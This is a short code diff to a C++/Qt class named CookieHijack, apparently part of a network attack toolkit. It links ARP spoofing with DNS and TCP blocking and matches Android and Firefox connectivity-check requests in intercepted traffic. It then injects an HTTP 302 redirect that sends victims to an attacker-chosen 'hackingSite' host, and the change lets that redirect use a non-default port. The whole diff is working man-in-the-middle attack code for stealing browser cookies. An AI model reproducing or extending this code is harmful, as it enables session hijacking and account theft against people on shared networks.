@@ -4,7 +4,8 @@ CookieHijack::CookieHijack(QObject* parent) : GGraph(parent) {
 	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlock_, &GDnsBlock::block, Qt::DirectConnection);
 
 	// 40 : minimum value of ip header size + tcp header size
-	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /generate_204 HTTP/1."));
+	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /generate_204 HTTP/1.")); // Android
+	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /success.txt?ipv4 HTTP/1.")); // Firefox
 
 	tcpBlock_.backwardBlockType_ = GTcpBlock::Fin;
 	// tcpBlock_.backwardFinMsg_ // set in doOpen
@@ -48,7 +49,9 @@ bool CookieHijack::doOpen() {
 
 	QStringList http;
 	http += "HTTP/1.1 302 Redirect";
-	http += QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
+	QString locationStr =  QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
+	if (httpPort_ != 80) locationStr += ":" + QString::number(httpPort_);
+	http += locationStr;
 	http += "";
 	http += "";
 	tcpBlock_.backwardFinMsg_ = http;
